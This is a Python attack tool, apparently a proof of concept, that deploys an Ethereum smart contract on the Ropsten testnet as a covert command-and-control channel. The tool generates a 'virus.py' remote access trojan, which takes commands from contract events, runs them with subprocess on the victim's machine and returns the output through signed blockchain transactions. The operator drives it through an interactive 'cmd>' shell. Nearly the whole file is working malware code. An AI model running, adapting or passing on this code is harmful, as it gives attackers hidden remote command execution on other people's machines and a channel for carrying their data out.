from web3 import Web3
import requests
import json
import sys
import time

infura_key = "wss://"

# add a /ws/ like this in your key:- ropsten.infura.io/ws/v3/PROJECT_ID
infura_key+= "ropsten.infura.io/ws/v3/PROJECT_ID" # Sign up on infura and get your ropsten key and paste here


# Source code of solidity is stored on another file
raw_abi='[{"constant":false,"inputs":[{"name":"_response","type":"string"}],"name":"toattacker","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_command","type":"string"}],"name":"tovictim","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"name":"command","type":"string"}],"name":"forvictim","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"command","type":"string"}],"name":"forattacker","type":"event"}]'
abi=json.loads(raw_abi)
bytecode= '608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506103f1806100606000396000f3fe608060405260043610610046576000357c01000000000000000000000000000000000000000000000000000000009004806318fffd9f1461004b578063537bdfea14610113575b600080fd5b34801561005757600080fd5b506101116004803603602081101561006e57600080fd5b810190808035906020019064010000000081111561008b57600080fd5b82018360208201111561009d57600080fd5b803590602001918460018302840111640100000000831117156100bf57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506101db565b005b34801561011f57600080fd5b506101d96004803603602081101561013657600080fd5b810190808035906020019064010000000081111561015357600080fd5b82018360208201111561016557600080fd5b8035906020019184600183028401116401000000008311171561018757600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192905050506102d0565b005b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156102cd577f08f954ded92d174e71d6c21a2494bbfb5d0e28bb33cd38bd8f5e0838444496d2816040518080602001828103825283818151815260200191508051906020019080838360005b83811015610292578082015181840152602081019050610277565b50505050905090810190601f1680156102bf5780820380516001836020036101000a031916815260200191505b509250505060405180910390a15b50565b3373ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614156103c2577f137ce3654bd03b152734a8f9231910307aa063b0b7272cd16464e43f952802ca816040518080602001828103825283818151815260200191508051906020019080838360005b8381101561038757808201518184015260208101905061036c565b50505050905090810190601f1680156103b45780820380516001836020036101000a031916815260200191505b509250505060405180910390a15b5056fea165627a7a723058208d576f7557394022f0dad7fd4b651e4fa7fcdf0aca32b423edb95c8bde2a15d10029'
    
# wallet credentials it will get for you
key=""
private_key=""

web3 = Web3(Web3.WebsocketProvider(infura_key))

def getcoin(wallet):
    print("[+] Getting some ETH")
    url="http://faucet.ropsten.be/donate/{}".format(wallet)
    r=requests.get(url)

    try:
        json.loads(r.text)["txhash"]
        print("[+] Token Got 1 ETH")
    except:
        print("\nSorry We can only get 1 ETH in 24 hours  with same ip so we will generate another wallet")
        gen_wallet()
        print("Now copy the key and go to here :- https://faucet.ropsten.be/ on a vpn or something and once you see the msg of 'Test ETH sent to {}' then  come back to this tool and hit enter :)".format(key))
        input("press any key to proceed...")
        
        
def gen_wallet():
    global key,private_key
    print("[+] Generating a Temp Wallet")
    # creating a wallet

    wallet_address_obj = web3.eth.account.create()

    # Assigning the values

    key=wallet_address_obj.address
    keystore = wallet_address_obj.encrypt("pwn@123")
    private_key=web3.eth.account.decrypt(keystore,'pwn@123').hex()
    print("\nkey:{}\nPrivate key:{}\n".format(key,private_key))

def main():
    global key,private_key
    gen_wallet()
    getcoin(key)  
    print("[*] Tool will sleep for 80 seconds to get the balance updated in our wallet")  
    time.sleep(80)
    starter(key,private_key)

    

    

def starter(key,private_key):

    web3.eth.defaultAccount=key
    
    # create object which will be later use to deploy
    contract_ = web3.eth.contract(abi=abi,bytecode=bytecode)

    print("[+] Building the Transaction for Contract Deployment")
    # build the transaction 
    construct_txn = contract_.constructor().buildTransaction({
    'from': key,
    'nonce': web3.eth.getTransactionCount(key),
    'gas': web3.eth.getBlock('latest').gasLimit,
    'gasPrice': web3.toWei('30', 'gwei')})

    # sign the transaction with private key
    signed = web3.eth.account.signTransaction(construct_txn,private_key)
    # deploy the transaction
    tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction).hex()
    

    # wait for transaction to be mined
    tx_reciept = web3.eth.waitForTransactionReceipt(tx_hash)
    if tx_reciept:
        print("[+] Recieved the confirmation of transaction")
        generate_virus(tx_reciept,abi,key,private_key)
        contract_address=tx_reciept.contractAddress
        virus_wait(contract_address)
        interact(tx_reciept,abi,key,private_key)


def interact(tx_reciept,abi,key,private_key):
    print("[+] Try executing commands now, Hopefully our virus has started :)")
    # Creating the object for interaction
    contract=web3.eth.contract(address=tx_reciept.contractAddress,abi=abi)
    contract_address=tx_reciept.contractAddress
    while True:
            command=input("cmd>")
            execute(key,private_key,contract,command,tx_reciept,contract_address)
   

def virus_wait(contract_address):
    print("[+] Waiting for a connection...")
    
    contracts = web3.eth.contract(address=contract_address, abi=abi)
    block_filter = web3.eth.filter({'fromBlock':'latest', 'address':contract_address})
    while True:
        try:
            for event in block_filter.get_new_entries():
                transaction = web3.eth.getTransaction(event['transactionHash'].hex())
                output=contracts.decode_function_input(transaction.input)[1]['_response']
                if output:
                    if output=="started":
                        return
                    else:
                        print(output)    
                        time.sleep(2)
        except:
            pass                
                      


def execute(key,private_key,contract,command,tx_reciept,contract_address):
    # use the write function
    construct_txn = contract.functions.tovictim(command).buildTransaction({
    'from': key,
    'nonce': web3.eth.getTransactionCount(key),
    'gas': web3.eth.getBlock('latest').gasLimit,
    'gasPrice': web3.toWei('30', 'gwei')})

    # signing the transaction

    signed = web3.eth.account.signTransaction(construct_txn,private_key)
    # deploy the transaction
    tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction).hex()
    tx_reciept= web3.eth.waitForTransactionReceipt(tx_hash)
    if tx_reciept:
        print("*Command Agent Started*\n")
        response_checker(contract_address)


def response_checker(contract_address):
    contract = web3.eth.contract(address=contract_address, abi=abi)
    block_filter = web3.eth.filter({'fromBlock':'latest', 'address':contract_address})
    while True:
        try:
            for event in block_filter.get_new_entries():
                transaction = web3.eth.getTransaction(event['transactionHash'].hex())
                output=contract.decode_function_input(transaction.input)[1]['_response']
                if output:
                    print(output)
                    return
                time.sleep(2)
        except:
            pass                   


def generate_virus(tx_reciept,abi,key,private_key):
        print("[+] Generating the virus poc")
        a=""
        a+="from web3 import Web3\n"
        a+="import json\n"
        a+="import sys\n"
        a+="import subprocess as sp\n"
        a+="import time\n"
        a+="key='{}'\n".format(key)
        a+="private_key='{}'\n".format(private_key)
        a+="abi=json.loads('{}')\n".format(raw_abi)
        a+="infura_key='{}'\n".format(infura_key)
        a+="contract_address='{}'\n".format(tx_reciept.contractAddress)
        a+="web3 = Web3(Web3.WebsocketProvider(infura_key))\n"
        a+="contract=web3.eth.contract(address=contract_address,abi=abi)\n"
        a+="""def virus(command):
            if command=='exit':
                sys.exit()
            output = sp.getoutput(command)
            sendback(output)\n"""


        a+="""def sendback(output):
            construct_txn = contract.functions.toattacker(output).buildTransaction({
            'from': key,
            'nonce': web3.eth.getTransactionCount(key),
            'gas': web3.eth.getBlock('latest').gasLimit,
            'gasPrice': web3.toWei('30', 'gwei')})
            signed = web3.eth.account.signTransaction(construct_txn,private_key)
            tx_hash = web3.eth.sendRawTransaction(signed.rawTransaction).hex()\n"""


        a+="""\ndef get_commands():
            block_filter = web3.eth.filter({'fromBlock':'latest', 'address':contract_address})
            while True:
                try:
                    for event in block_filter.get_new_entries():
                        transaction = web3.eth.getTransaction(event['transactionHash'].hex())
                        command=contract.decode_function_input(transaction.input)[1]['_command']
                        virus(command)
                except:
                    pass   """     

        a+="""\ndef start():
            sendback("started")
            get_commands()"""

        a+="\nstart()"    

        f=open("virus.py","w")
        f.write(a)
        f.close()        

main()
